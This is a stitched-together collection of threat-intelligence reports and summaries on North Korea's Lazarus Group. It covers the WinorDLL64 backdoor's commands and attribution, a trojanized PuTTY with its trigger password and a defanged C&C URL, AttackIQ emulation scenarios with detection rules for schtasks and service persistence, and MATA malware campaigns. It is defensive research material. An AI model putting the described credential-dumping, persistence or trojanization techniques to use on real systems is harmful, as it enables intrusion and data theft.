This blogpost explains the attribution of WinorDLL64 to Lazarus and provides an analysis of the payload.
Links to Lazarus
We have discovered overlaps in both behavior and code with Lazarus samples from Operation GhostSecret and the Bankshot implant described by McAfee. The description of the implants in both GhostSecret and Bankshot articles contains overlaps in the functionality with WinorDLL64 and we found some code overlap in the samples. In this blogpost we will only use the FE887FCAB66D7D7F79F05E0266C0649F0114BA7C sample from GhostSecret for comparison against WinorDLL64 (1BA443FDE984CEE85EBD4D4FA7EB1263A6F1257F), unless specified otherwise.
The following details summarize the supporting facts for our low confidence attribution to Lazarus:
1. Victimology
•	Fellow researchers from AhnLab confirmed South Korean victims of Wslink in their telemetry, which is a relevant indicator considering the traditional Lazarus targets and that we have observed only a few hits.
 
Figure 1. Reported South Korean victim, where mstoned7 is the researcher from Ahnlab
2. Malware
•	The latest GhostSecret sample reported by McAfee (FE887FCAB66D7D7F79F05E0266C0649F0114BA7C) is from February 2018; we spotted the first sample of Wslink in late 2018 and fellow researchers reported hits in August 2018, which they disclosed after our publication. Hence, these samples were spotted a relatively short period of time apart.
•	The PE rich headers indicate that the same development environment and projects of similar size were used in several other known Lazarus samples (e.g., 70DE783E5D48C6FBB576BC494BAF0634BC304FD6; 8EC9219303953396E1CB7105CDB18ED6C568E962). We found this overlap using the following rules that cover only these Wslink and Lazarus samples, which is an indicator with a low weight. We tested them on VirusTotal’s retrohunt and our internal file corpus.
rich_signature.length == 80 and
pe.rich_signature.toolid(175, 30319) == 7 and
pe.rich_signature.toolid(155, 30319) == 1 and
pe.rich_signature.toolid(158, 30319) == 10 and
pe.rich_signature.toolid(170, 30319) >= 90 and
pe.rich_signature.toolid(170, 30319) <= 108
This rule can be translated to the following notation that is more readable and used by VirusTotal, where one can see the product version and build ID (VS2010 build 30319), number and type of source/object files used ([LTCG C++] where LTCG stands for Link Time Code Generation, [ASM], [ C ]), and number of exports ([EXP]) in the rule:
[LTCG C++] VS2010 build 30319 count=7
[EXP] VS2010 build 30319 count=1
[ASM] VS2010 build 30319 count=10
[ C ] VS2010 build 30319 count in [ 90 .. 108 ]
•	The GhostSecret article described “a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections” that additionally ran as a service. This is an accurate description of Wslink downloader behavior, apart from the port number, which can vary based on the configuration. To sum it up, even though the implementation is different, both serve the same purpose.
•	The loader is virtualized by Oreans’ Code Virtualizer, which is a commercial protector that is used frequently by Lazarus.
•	The loader uses the MemoryModule library to load modules directly from memory. The library is not commonly used by malware, but it is quite popular among North Korea-aligned groups such as Lazarus and Kimsuky.
•	Overlap in the code between WinorDLL64 and GhostSecret that we found during our analysis. The results and the significance in attribution are listed in Table 1.
Table 1. Similarities between WinorDLL64 and GhostSecret and their significance in attributing both to the same threat actor
Other similarities between WinorDLL64 and GhostSecret	Impact
Code overlap in code responsible to get processor architecture	Low
Code overlap in current directory manipulation	Low
Code overlap in getting the process list	Low
Code overlap in file sending	Low
Behavior overlap in listing processes	Low
Behavior overlap in current directory manipulation	Low
Behavior overlap in file and directory listing	Low
Behavior overlap in listing volumes	Low
Behavior overlap in reading/writing files	Low
Behavior overlap in creating processes	Low
Considerable behavior overlap in secure removal of files	Low
Considerable behavior overlap in termination of processes	Low
Considerable behavior overlap in collecting system information	Low
Code overlap in the file sending functionality is highlighted in Figure 2 and Figure 3.
 
Figure 2. GhostSecret sending a file
 
Figure 3. Wslink sending a file
Technical analysis
WinorDLL64 serves as a backdoor that most notably acquires extensive system information, provides means for file manipulation, and executes additional commands. Interestingly, it communicates over a TCP connection that was already established by its loader and uses some of the loader’s functions.
 
Figure 4. Visualization of Wslink's communication
The backdoor is a DLL with a single unnamed export that accepts one parameter – a structure for communication that was already described in our previous blogpost. The structure contains a TLS-context – socket, key, IV – and callbacks for sending and receiving messages encrypted with 256-bit AES-CBC that enable WinorDLL64 to exchange data securely with the operator over an already established connection.
The following facts lead us to believe with high confidence that the library is indeed part of Wslink:
•	The unique structure is used everywhere in the expected way, e.g., the TLS-context and other meaningful parameters are supplied in the anticipated order to the correct callbacks.
•	The name of the DLL is WinorDLL64.dll and Wslink’s name was WinorLoaderDLL64.dll.
WinorDLL64 accepts several commands. Figure 5 displays the loop that receives and handles commands. Each command is bound to a unique ID and accepts a configuration that contains additional parameters.
 
Figure 5. The main part of the backdoor’s command-receiving loop
The command list, with our labels, is in Figure 6.
 
Figure 6. The command list
Table 2 contains a summary of the WinorDLL64 commands, where modified, and old categories refer to the relationship to the previously documented GhostSecret functionality. We highlight only significant changes in the modified category.
Table 2. Overview of backdoor commands
Category	Command ID	Functionality	Description
New	0x03	Execute a PowerShell command	WinorDLL64 instructs the PowerShell interpreter to run unrestricted and to read commands from standard input. Afterwards, the backdoor passes the specified command to the interpreter and sends the output to the operator.
	0x09	Compress and download a directory	WinorDLL64 recursively iterates over a specified directory. The content of each file and directory is compressed separately and written to a temporary file that is afterwards sent to the operator and then removed securely.
	0x0D	Disconnect a session	Disconnects a specified logged-on user from the user’s Remote Desktop Services session. The command can also perform different functionality based on the parameter.
	0x0D	List sessions	Acquires various details about all sessions on the victim’s device and sends them to the operator. The command can also perform different functionality based on the parameter.
	0x0E	Measure connection time	Uses the Windows API GetTickCount to measure the time required to connect to a specified host.
Modified	0x01	Get system info	Acquires comprehensive details about the victim’s system and sends them to the operator.
	0x0A	Remove files securely	Overwrites specified files with a block of random data, renames each file to a random name, and finally securely removes them one by one.
	0x0C	Kill processes	Terminates all processes whose names match a supplied pattern and/or with a specific PID.
Old	0x02/0x0B	Create a process	Creates a process either as the current or specified user and optionally sends its output to the operator.
0x05	Set/Get current directory	Attempts to set and subsequently acquire the path of the current working directory.	
0x06	List volumes	Iterates over drives from C: to Z: and acquires the drive type and volume name. The command can also perform different functionality based on the parameter.	
0x06	List files in a directory	Iterates over files in specified directory and acquires information such as names, attributes, etc. The command can also perform different functionality based on the parameter.	
0x07	Write to a file	Downloads and appends the stated amount of data to specified file.	
0x08	Read from a file	The specified file is read and sent to the operator.	
0x0C	List processes	Acquires details about all running processes on the victim’s device and additionally sends ID of the current process.	
Conclusion
Wslink’s payload is dedicated to providing means for file manipulation, execution of further code, and obtaining extensive information about the underlying system that possibly can be leveraged later for lateral movement, due to specific interest in network sessions. The Wslink loader listens on a port specified in the configuration and can serve additional connecting clients, and even load various payloads.
WinorDLL64 contains an overlap in the development environment, behavior, and code with several Lazarus samples, which indicates that it might be a tool from the vast arsenal of this North-Korea aligned APT group.
ESET Research offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page.
IoCs
SHA-1	ESET detection name	Description
1BA443FDE984CEE85EBD4D4FA7EB1263A6F1257F	Win64/Wslink.A	Memory dump of discovered Wslink payload WinorDll64.
MITRE ATT&CK techniques
This table was built using version 12 of the ATT&CK framework. We do not mention techniques from the loader again, only the payload.
Tactic	ID	Name	Description
Resource Development	T1587.001
Develop Capabilities: Malware	WinorDLL64 is a custom tool.
Execution	T1059.001
Command and Scripting Interpreter: PowerShell	WinorDLL64 can execute arbitrary PowerShell commands.
	T1106
Native API	WinorDLL64 can execute further processes using the CreateProcessW and CreateProcessAsUserW APIs.
Defense Evasion	T1134.002
Access Token Manipulation: Create Process with Token	WinorDLL64 can call APIs WTSQueryUserToken and CreateProcessAsUserW to create a process under an impersonated user.
	T1070.004
Indicator Removal: File Deletion	WinorDLL64 can securely remove arbitrary files.
Discovery	T1087.001
Account Discovery: Local Account	WinorDLL64 can enumerate sessions and list associated user, and client names, among other details.
	T1087.002
Account Discovery: Domain Account	WinorDLL64 can enumerate sessions and list associated domain names –among other details.
	T1083
File and Directory Discovery	WinorDLL64 can obtain file and directory listings.
	T1135
Network Share Discovery	WinorDLL64 can discover shared network drives.
	T1057
Process Discovery	WinorDLL64 can collect information about running processes.
	T1012
Query Registry	WinorDLL64 can query the Windows registry to gather system information.
	T1082
System Information Discovery	WinorDLL64 can obtain information such as computer name, OS and latest service pack version, processor architecture, processor name, and amount of space on fixed drives.
	T1614
System Location Discovery	WinorDLL64 can obtain the victim’s default country name using the GetLocaleInfoW API.
	T1614.001
System Location Discovery: System Language Discovery	WinorDLL64 can obtain the victim’s default language using the GetLocaleInfoW API.
	T1016
System Network Configuration Discovery	WinorDLL64 can enumerate network adapter information.
	T1049
System Network Connections Discovery	WinorDLL64 can collect a list of listening ports.
	T1033
System Owner/User Discovery	WinorDLL64 can enumerate sessions and list associated user, domain, and client names –among other details.
Collection	T1560.002
Archive Collected Data: Archive via Library	WinorDLL64 can compress and exfiltrate directories using the quicklz library.

	T1005
Data from Local System	WinorDLL64 can collect data on the victim’s device.
Impact	T1531
Account Access Removal	WinorDLL64 can disconnect a logged-on user from specified sessions.

 
No Pineapple! –DPRK Targeting of Medical Research and Technology Sector
By Sami Ruohonen and Stephen Robinson on 2nd Feb 2023
 
1.	No Pineapple! –DPRK Targeting of Medical Research and Technology Sector
Sami Ruohonen
Stephen Robinson
Share
Download the publication
No Pineapple! –DPRK Targeting of Medical Research and Technology Sector
Summary
During Q4 2022, WithSecure™ detected and responded to a cyber attack conducted by a threat actor that WithSecure™ have attributed with high confidence to an intrusion set referred to as Lazarus Group. Attribution with high confidence was based off of overlapping techniques tactics and procedures as well as an operational security mistake by the threat actor. Amongst technical indications, the incident observed by WithSecure™ also contains characteristics of recent campaigns attributed to Lazarus Group by other researchers.
The campaign targeted public and private sector research organizations, the medical research and energy sector as well as their supply chain. The motivation of the campaign is assessed to be most likely for intelligence benefit. Previous reporting on similar campaigns highlights the targeting of technology with military implementations and WithSecure™ assesses that this type of targeting continued through Q4 2022.
WithSecure™ Threat Intelligence has named this report ‘No Pineapple’ due to an error message in a backdoor which will append < No Pineapple! > in the event data when it exceeds segmented byte size.
 
Key Incident Points
•	Initial compromise and privilege escalation was through exploitation of known vulnerabilities in unpatched Zimbra devices
•	Threat actor used off the shelf webshells and custom binaries, as well as abusing legitimate Windows and Unix tools (Living Off the Land)
•	Threat actor installed tools for proxying, tunnelling and relaying connections
•	C2 behavior suggests a small number of C2 servers connecting via multiple relays/endpoints. Some C2 servers appear to themselves be compromised victims 
•	Threat actor exfiltrated ~100GB of data but took no destructive action by the point of disruption
•	Other observed possible victim verticals and exfiltration by the threat actor imply the motive is intelligence collection
•	Strong confidence that threat actor is North Korean state sponsored intrusion set Lazarus Group
 
WithSecure™ Detection Coverage 
WithSecure™ Elements Endpoint Protection and Endpoint Detection and Response offer multiple detections to identify the malicious actions detailed in the report, including: 
WithSecure™ Elements Endpoint Protection
•	Backdoor:W64/BindShell.*
•	Backdoor:W32/Rease.*
•	Riskware:W32/3proxy.*
•	Backdoor:W64/Acres.*
•	Trojan-Dropper:W64/DTrack.*
•	PotentiallyUnwanted:W32/App.relch
•	Malware.Java/Webshell.G
•	Backdoor:Java/Webshell.B
WithSecure™ Elements Endpoint Detection and Response
•	Impacket atremote
•	Custom malware executed
•	Uncommon jsp accessed in zimbra
•	Cobalt strike jquery malleable c2 profile
•	Credentials extracted from lsass memory
•	Enable wdigest uselogoncredential
 
Emulating the Highly Sophisticated North Korean Adversary Lazarus Group
Published January 5, 2023
AttackIQ has released a bundle of content consisting of six new attack graphs that seek to emulate the campaigns and operations led by the infamous North Korean-sponsored adversary Lazarus Group against entities worldwide across multiple sectors.
Lazarus Group, also known as Hidden Cobra, is a state-sponsored adversary attributed to the Reconnaissance General Bureau (RGB) of the Democratic People’s Republic of Korea (DPRK) which has been active since at least 2009. The Lazarus Group is composed of at least two subgroups, both known as Andariel and BlueNoroff, and has notable overlaps with the adversaries known as APT37 and Kimsuky.
Lazarus Group’s main motivations are theft of proprietary information, espionage, sabotage, and destruction. The group first came to media attention in 2013, following a series of coordinated attacks against South Korean media and financial entities using the wiper known as DarkSeoul.
Their most notorious campaign occurred in November 2014 when the Lazarus Group conducted a large-scale destructive attack against Sony Pictures Entertainment (SPE), which was notable due to the substantial penetration through the network, the large amount of exfiltrated data, and the use of a wiper to erase all forensic evidence.
AttackIQ has released six new attack graphs emulating the actor’s historical campaigns to help customers validate their security controls and their ability to defend against this group. Validating your security program performance against these behaviors is vital to reducing risk. By using these new attack graphs in the AttackIQ Security Optimization Platform, security teams will be able to:
•	Evaluate security control performance against the top North Korean threat actor who has targeted all regions and sectors.
•	Assess their security posture against a threat actor who is not afraid to commit destructive actions.
•	Continuously validate detection and prevention pipelines against the techniques shared amongst many of the North Korean adversaries.
Lazarus Group – 2018-12 – Operation Sharpshooter
 (Click for Larger)
The first attack graph is based on Operation Sharpshooter reported by McAfee in December 2018. Operation Sharpshooter took place between October and November 2018 against more than 80 organizations worldwide, predominantly those located in the United States. During this attack, the adversary focused on targeting multiple sectors, specifically those involved in finance, energy, and defense.
 (Click for Larger)
The attack graph begins with the downloading and saving of the malicious Office Document used for the deployment of the Rising Sun implant, which obtains persistence through the Startup folder.
Ingress Tool Transfer (T1105): This scenario downloads to memory and saves to disk in two separate scenarios to test network and endpoint controls and their ability to prevent the delivery of known malicious samples of Lazarus malware. These scenarios are used for each stage of the malware delivered in these attacks.
Logon Autostart Execution: Startup Folder (T1547.001): The Startup folder is a directory associated with the Windows Start Menu that can be used to launch a process at Windows logon. This scenario creates a binary file in this directory that would execute at next logon for users.
 (Click for Larger)
During the second stage, the graph seeks to collect information from various sources about the system environment prior to the exfiltration of the encrypted collected data.
File and Directory Discovery (T1083): This scenario uses the native dir command to find files of interest and output to a temporary file.
System Network Configuration Discovery (T1016): Native Window’s commands like route, ipconfig, and net use are executed to collect details about the infected host and network shares.
System Owner / User Discovery (T1033): Living off the land by running whoami and users to gain details about the currently available accounts and permission groups.
System Information Discovery (T1082): The native hostname and systeminfo commands are used to get the infected host’s computer name and basic details about the system.
Query Registry (T1012): The HKCU\Software\Microsoft\Windows\CurrentVersion registry key contains information about Windows properties for the user account logged into the system.
Data Staged: Local Data Staging (T1074.001): Files are collected and stored in a temporary directory so they can be exfiltrated later.
Exfiltration Over Symmetric Encrypted Non-C2 Protocol (T1048.001): Files are first encrypted using AES encryption and then transmitted over HTTPS using POST requests.
 (Click for Larger)
In the last stage, the implant seeks to obtain in-depth information about the files contained in the system and peripheral devices, finalizing with the communication to the adversary’s infrastructure.
Process Discovery (T1057): tasklist is executed as a command process and the results are saved to a temporary location.
System Information Discovery (T1082): The native Windows commands logicaldisk and diskdrive are executed to collect information about the installed disks, including caption, description, drive type, provider name, and size.
Application Layer Protocol: Web Protocols (T1071.001): This scenario emulates the HTTP requests made by the Rising Sun backdoor by making an HTTP POST to an AttackIQ server that mimics the URL format and data sent by a real infection.
Lazarus Group – 2020-06 – Operation In(ter)ception
 (Click for Larger)
The second attack graph is based on the Operation In(ter)ception report by ESET published in June 2020. Operation In(ter)ception was a campaign conducted against military and aerospace organizations in Europe and the Middle East. The actor used social engineering via LinkedIn, hiding behind the ruse of attractive, but bogus, job offers.
 (Click for Larger)
The attack graph begins with the downloading and saving of a malicious LNK file, which seeks to evade defenses by masquerading as a legitimate process when executed. Next, the graph seeks to obtain persistence through a scheduled task and executes a remote XSL script. The first-stage downloader is downloaded, saved, and executed as a new service.
Masquerading: Match Legitimate Name or Location (T1036.005): A copy of the legitimate wmic.exe binary is placed in a temporary directory. The file is renamed to ncv.exe and executed to get details on the OS version.
Scheduled Task/Job: Scheduled Task (T1053.005): This scenario creates a new scheduled task using the schtasks utility with the name HPSync that was observed being used in these attacks.
XSL Script Processing (T1220): wmic.exe is executed and passed a URL as a command line argument that forces the binary to download and execute an XSL file that contains malicious JavaScript code.
Windows Service (T1543.003): Use the native sc command line tool to create a new service that will executed at reboot.
 (Click for Larger)
The second stage is downloaded and executed using RunDLL32, and in case it is prevented, it will alternatively be executed through RegSvr32. Finally, the graph will seek to obtain information from the environment exfiltrate to adversary infrastructure.
System Binary Proxy Execution: Rundll32 (T1218.011): RunDll32 is a native system utility that can be used to execute DLL files and call a specific export inside the file. This scenario executes RunDll32 with an AttackIQ DLL and calls an export to mimic previously reported malicious activity.
System Binary Proxy Execution: Regsvr32 (T1218.010): RegSvr32 is a native Windows utility that threat actors can use to register Common Object Model (COM) DLLs. This functionality allows an actor to deploy a malicious DLL and have a native Windows tool execute the code as the parent process. This scenario executes RegSvr32 with an AttackIQ binary.
System Network Connections Discovery (T1049): The native Windows command line tool netstat is used to collect active connections and any listening services running on the host.
Lazarus Group – 2020-08 – Operation Dream Job (ClearSky)
 (Click for Larger)
This attack graph emulates the first iteration of the Operation Dream Job, reported by ClearSky in August 2020. Operation Dream Job was a cyberattack carried out against multiple individuals worldwide from early 2020 to mid-2022. The actors used social media to phish victims in the defense sector and various government organizations leveraging fake job offers from prominent defense and aerospace companies.
 (Click for Larger)
The attack graph begins with the downloading and saving of a malicious Office document, which obtains persistence through the Startup folder, using a dropped LNK shortcut file. Subsequently, the DBLL Loader is downloaded and saved to the system, which is executed through RunDLL32 and to complete the deployment of the final payload known as DRATzarus.
 (Click for Larger)
In the last stage, after downloading and saving DRATzarus to the system, the attack graph recreates the communications captured between the malware sample and the adversary’s infrastructure, ending with the collection of the network connections available in the system and obtaining credentials from the browser through LaZagne.
OS Credential Dumping (T1003): This scenario uses the open-source tool LaZagne to dump credentials available on the host including the saved browser passwords.
Lazarus Group – 2022-04 – Operation Dream Job (Symantec)
 (Click for Larger)
The next attack graph continues to emulate the second iteration of the Dream Job operation, this time from activity reported by Symantec in April 2022.
 (Click for Larger)
The attack graph starts by downloading and saving a trojanized version of the ComparePlus plugin DLL, which is a Notepad++ plugin used to compare two files and show differences side by side. After being executed via RunDLL32, the attack graph will seek to inject code into an active process.
Process Injection (T1055): This scenario injects a DLL file into another running process and validates if a canary file can be created.
 (Click for Larger)
Subsequently, it will attempt to perform lateral movement by using Windows Management Instrumentation (WMI), continuing with obtaining credentials through the registry or by dumping of the SAM database, and finishing with obtaining persistence through a scheduled task.
Windows Management Instrumentation (T1047): This scenario uses wmic commands to execute commands on a remote target.
Unsecured Credentials: Credentials in Registry (T1552.002): A PowerShell script is executed that searches for DefaultPassword and AltDefaultPassword registry keys that contain hard-coded credentials.
OS Credential Dumping: Security Account Manager (T1003.002): The built-in reg save command is executed to dump the Windows SAM hive.
 (Click for Larger)
In the last stage, the attack graph will try to obtain information about the active network connections and drop their tool known as SiteShooter. Finally, it will collect information about the infected environment, ending up obtaining the system network configuration.
Lazarus Group – 2021-01 – ThreatNeedle Campaign
 (Click for Larger)
The ThreatNeedle campaign was a cyberattack against security researchers and the defense industry from mid-2020 to early 2021 reported by Kaspersky. During this attack, Lazarus made use of the malware family known as ThreatNeedle, which is based on the Manuscrypt family. The group leveraged COVID-19-themed emails, personalizing them with personal information obtained during an initial reconnaissance effort.
 (Click for Larger)
The attack graph begins with obtaining persistence through the Startup folder and immediately continues with the deployment of the ThreatNeedle Loader, which seeks to create a new service to load the ThreatNeedle backdoor.
Modify Registry (T1112): This scenario sets the same registry key used by the actor by calling the New-ItemProperty cmdlet.
 (Click for Larger)
In the last stage, the attack graph will seek to collect system information, obtain credentials, and move laterally through the victim network, ending with tunneling an SSH connection to external infrastructure.
OS Credential Dumping (T1003): This scenario uses the open-source tool MimiKatz to dump all possible credentials available on the host.
System Service Discovery (T1007): Microsoft’s native sc utility is executed to query a list of all running services.
Protocol Tunneling (T1572): This scenario tests security controls responsible for blocking outbound SSH connections to external servers.
Lazarus Group – 2022-07 – MagicRAT + TigerRAT Campaign
 (Click for Larger)
The sixth and final attack graph seeks to emulate the activity reported by Cisco Talos in September 2022. During this activity, researchers observed the compromise of victims with a new Remote Access Trojan they named MagicRAT delivered by exploiting publicly exposed VMWare Horizon platforms. During this activity, Lazarus Group additionally used TigerRAT, a malware previously attributed to the Andariel adversary during Operation ByteTiger in September 2021.
 (Click for Larger)
This attack graph starts with the deployment of MagicRAT immediately after the exploitation of vulnerabilities present in VMWare Horizon platforms. During this first stage, MagicRAT will seek to obtain persistence using a scheduled task or the Startup folder prior to checking in and registering with the actor’s infrastructure.
 (Click for Larger)
In the second stage of the attack, the actor completes some basic discovery commands before attempting to quickly exfiltrate some files of interest.
Exfiltration Over C2 Channel (T1041): Files are sent to an AttackIQ controlled server using HTTP POST requests.
 (Click for Larger)
In the next stage, Lazarus Group uses a lightweight port scanner to obtain information about the open ports available on other systems located in the infected host’s local network. The actor continues to stage data it discovers for delivery on the next check-in with the command-and-control server.
Network Service Discovery (T1046): This scenario uses nmap for scanning hosts that are open on ports 139,389,445,636,3389 that would identify remotely accessible hosts to the attacker.
 (Click for Larger)
TigerRAT, a Remote Access Trojan (RAT) previously used during Operation ByteTiger first reported by the KrCERT, is deployed. This RAT will seek to obtain additional information from the environment.
 (Click for Larger)
In the final stages of the attack graph, the actor makes one final attempt to look for files of interest and checks for the existing of any additional connected drives and collect data from removable media. All of the data collected during the attack is exfiltrated to the actor’s infrastructure.
Data from Removable Media (T1025): The native utility fsutil is used to identify any additional hard disks connected to the host. PowerShell is then used to iterate through every removable media device and harvest a list of files.
Detection and Mitigation Opportunities
With so many different techniques being used by threat actors, it can be difficult to know which to prioritize for prevention and detection assessment. AttackIQ recommends first focusing on the following techniques emulated in our scenarios before moving on to the remaining techniques.
The attacks from the Lazarus Group are long drawn-out campaigns that require the actor to collect data and infiltrate the victim over time. One of best ways to limit the actor’s ability to live in your network is to scrutinize the persistence mechanisms used by the group.
1. Windows Service (T1543.003)
Actors can create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.
1a. Detection
The following rules can help identify when that persistence mechanism is being set.
Process Name == (Cmd.exe OR Powershell.exe)
Command Line CONTAINS (‘sc’ AND ‘create’ AND ‘start= “auto”’)
1b. Mitigation
MITRE ATT&CK has the following mitigation recommendations
•	M1047 – Audit
•	M1040 – Behavior Prevention on Endpoint
•	M1018 – User Account Management
2. Scheduled Task/Job: Scheduled Task (T1053.005)
Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly from the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.
2a. Detection
With an EDR or SIEM Platform, you can detect the following commands being issued to schedule a malicious task
Process Name = (“cmd.exe” OR “Powershell.exe”)
Command Line CONTAINS (“schtasks” AND “/CREATE” AND (“cmd” OR “powershell”)
2b. Mitigation
MITRE ATT&CK has the following mitigation recommendations
•	M1047 – Audit
•	M1028 – Operating System Configuration
•	M1026 – Privileged Account Management
•	M1018 – User Account Management
3. Startup Folder (T1547.001)
Each user profile has their own StartUp directory and there is also an additional directory that applies to all folders. Actors may place binaries and scripts in here directly or they can place shortcut LNK files that can point to a file to be executed.
3a. Detection
With an EDR or SIEM Platform, you can identify processes originating from the StartUp directory and later add exclusions for known legitimate processes specific to your environment.
Command Line CONTAINS (“StartUp”)
3b. Mitigation
MITRE ATT&CK does not have any mitigation recommendations as this is an abuse of system features. Auditing and Process Logging are the best options.
Wrap-up
In summary, these attack graphs will evaluate security and incident response processes and support the improvement of your security control posture against one of the most dangerous threat actors in the world today. With data generated from continuous testing and use of these attack graphs, you can focus your teams on achieving key security outcomes, adjust your security controls, and work to elevate your total security program effectiveness against a known and dangerous threat.
AttackIQ stands at the ready to help security teams implement this attack graph and other aspects of the AttackIQ Security Optimization Platform, including through our co-managed security service, AttackIQ Vanguard.
 
https://download.hauri.net/DownSource/down/dwn_detail_down.html?uid=55

Campaign Initiation: The campaign by the Lazarus Group began in June of 2022.

Targeted Software: The group has been modifying open-source software such as PuTTY, KiTTY, TightVNC, Sumatra PDF Reader, and muPDF/Subliminal Recording to create malware.

Distribution Method: The malware was distributed by impersonating recruiters on LinkedIn and targeting engineers at specific companies.

Malware Activation: The modified software does not perform malicious actions immediately upon execution. Instead, it requires specific triggers, like opening a particular PDF or connecting to a server using the modified PuTTY, to initiate malicious activities. This strategy is likely designed to evade detection by automated analysis tools like SandBox.

Detailed Malware Analysis:

putty.exe:
MD5 Hash: 1D5AD4A60EC9BE32C11AD99F234BFE8F
Size: 1,228,288 bytes
Behavior: It remains non-malicious until a specific password ("8kcgan0Hay2") is entered during an SSH connection.
Malicious Code Addition: The malware code is added to the ssh2_userauth_process_queue function in the Putty.exe file.
usrgroup.dat:
MD5 Hash: 420A13202D271BABC32BF8259CDADDF3
Size: 64,000 bytes
Function: It is set to run every 5 minutes via the task scheduler and is responsible for decrypting and executing the thumbcache_512.db file. It also performs execution argument checks to evade Sandbox-based analysis.
thumbcache_512.db:
MD5 Hash: 183A514A151388D8348689922CC62929
Decryption Method: Uses an XOR operation with a key generated from the execution argument "zJwY" followed by Zlib Decompression.
C&C Communication: Checks for the execution argument "4701" and sends encoded data to the C&C server.
C&C Server Communication: The malware communicates with the C&C server at hxxps://blockchain-newtech.com/download/download.asp every 13 seconds, awaiting plugin transmission from the attacker.

Additional Plugins and Capabilities:

The report suggests the existence of various plugins, including file theft and screen capture functionalities.
The malware can collect and transmit detailed information about the infected system, including OS, hardware, network information, and process lists.
Indicators of Compromise (IOC):

C&C Server URL: hxxps://blockchain-newtech.com/download/download.asp
File Hashes:
putty.exe: 1D5AD4A60EC9BE32C11AD99F234BFE8F
usrgroup.dat: 420A13202D271BABC32BF8259CDADDF3
thumbcache_512: 183A514A151388D8348689922CC62929
GetInfo64.dll: C26CE084A631E11B250280724ADFEA0A
ScreenCaptureDll64.dll: 2F86BB7B912A61F8D323DDE362C0DD1A
Stop.dll: D0C2F269E8C70F5211974B82D6B79856
 
https://web-assets.esetstatic.com/wls/en/papers/threat-reports/eset-apt-activity-report-q2-2023-q3-2023.pdf

summary focusing on the Lazarus Group's activities as mentioned in the ESET APT Activity Report for April to September 2023:

Lazarus Group (North Korea-Aligned)
Operation DreamJob: The most active scheme observed by Lazarus during this period was Operation DreamJob. This operation involved spearphishing emails with fake job offers for lucrative positions, targeting entities in Japan, South Korea, and those focused on South Korea.

Malware Development: Lazarus demonstrated its capability to create malware for all major desktop platforms. They continued to use the SimpleTea malware family, a common code base for creating malware across Windows, Linux, and macOS.

April 2023 Activities:

OdicLoader and SimplexTea Linux Malware: Connected to the 3CX supply-chain attack, Lazarus used OdicLoader, an ELF downloader, to fetch and execute the SimplexTea Linux backdoor from the OpenDrive cloud service. SimplexTea was part of the Lazarus code base used for multiple operating systems.
September 2023 Activities:

New Variant of OdicLoader: A new variant of OdicLoader was submitted to VirusTotal from Slovenia. This variant was disguised as a MultiLayerSwap theme, targeting cryptocurrency-related entities.
macOS Payloads: Lazarus used macOS payloads against its targets, with samples of SimpleTea for macOS uploaded to VirusTotal from Hong Kong and China. They also discovered a macOS WebbyTea downloader, capable of selecting payloads based on the operating system.
Targeted Countries and Verticals: Lazarus primarily focused on Japan, South Korea, and entities related to South Korea. They employed carefully crafted spearphishing emails to lure their targets.

Other Notable Information:

Capability to Attack Major Operating Systems: Lazarus has shown the ability and willingness to attack all major operating systems, indicating a high level of sophistication and adaptability in their cyberespionage tactics.
 
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/10/18092216/Updated-MATA-attacks-Eastern-Europe_full-report_ENG.pdf

report titled "Updated MATA attacks industrial companies in Eastern Europe," here is a detailed summary focusing on the MATA malware cluster, attributed to the Lazarus group, and its activities compromising defense contractor companies in Eastern Europe from September 2022 to May 2023:

Executive Summary
Time Frame: The campaign was active from early September 2022 until May 2023.
Targets: Defense contractor companies in Eastern Europe.
Malware Distribution: Spear-phishing techniques were used to distribute the updated MATA malware over multiple stages using validators.
Malware Capabilities: The new MATA generations introduced modifications to encryption, configuration, and communication protocols. They are capable of circumventing network limitations and building complex proxy chains within victims’ networks.
Key Findings
Initial Infection Techniques:

Malicious documents and download links for executables were used for initial infection.
Spear-phishing documents impersonated legitimate employees, indicating extensive reconnaissance.
The attackers used a CVE-2021-26411 exploit in the documents, previously used by Lazarus against security researchers.
MATA Variants:

MATA “LLoader” (LLibrary): Infected several victims via an Internet Explorer exploit. It fetched the next stage payload from an embedded URL.
MATA Validator: Written in C++, it profiles the victim using various whoami commands and connects to the C2 server for further instructions.
MataDoor (MATA generation 4): Rewritten from scratch, this variant controls the victim similar to older MATA versions. It uses OpenSSL for covert network communication and supports multiple protocols.
MATA generation 5: A sophisticated malware completely rewritten, capable of functioning as both a service and a DLL within different processes. It uses Inter-Process Communication (IPC) channels and a diverse range of commands.
Attack Detection and Analysis:

The campaign was detected by monitoring the telemetry of security solutions using Kaspersky Security Network.
The attackers targeted several victims using spear-phishing techniques and infected others by downloading files through an internet browser.
Infection Chain:

The infection chain employed a combination of loader, main trojan, and stealer infection chains, similar to those used by the previous MATA cluster.
The attackers utilized a user-mode rootkit to elevate privileges and bypass endpoint security products.
Conclusions
The updated MATA malware demonstrates advanced capabilities in terms of network circumvention and complex proxy chain creation.
The Lazarus group continues to evolve its techniques and malware to target industrial entities effectively.

Overview
Campaign Duration: Active from September 2022 to May 2023.
Target: Defense contractors in Eastern Europe.
Malware: Updated MATA malware, distributed via spear-phishing and exploiting vulnerabilities.
Infection Techniques
Initial Infection:

Malicious Documents: Spear-phishing emails with documents containing external links to fetch remote pages with exploits.
Exploit Used: CVE-2021-26411, previously leveraged by Lazarus against security researchers.
Downloader Infection: Some victims downloaded Windows executable malware through a browser, indicating a different infection vector.
MATA Variants:

MATA “LLoader” (LLibrary): Infected victims via Internet Explorer exploit, fetching the next stage payload from an embedded URL.
MATA Validator: C++ module profiling victims using whoami commands and connecting to C2 servers for further instructions.
MataDoor (MATA Generation 4): A complete rewrite of previous MATA malware, with extensive control capabilities over victims. Uses OpenSSL for covert communication and supports multiple protocols.
MATA Generation 5: A sophisticated, completely rewritten malware with advanced architecture, functioning as both a service and a DLL. Employs IPC channels and supports various commands for establishing proxy chains.
Attack Detection and Analysis
Detection: Identified through Kaspersky Security Network telemetry.
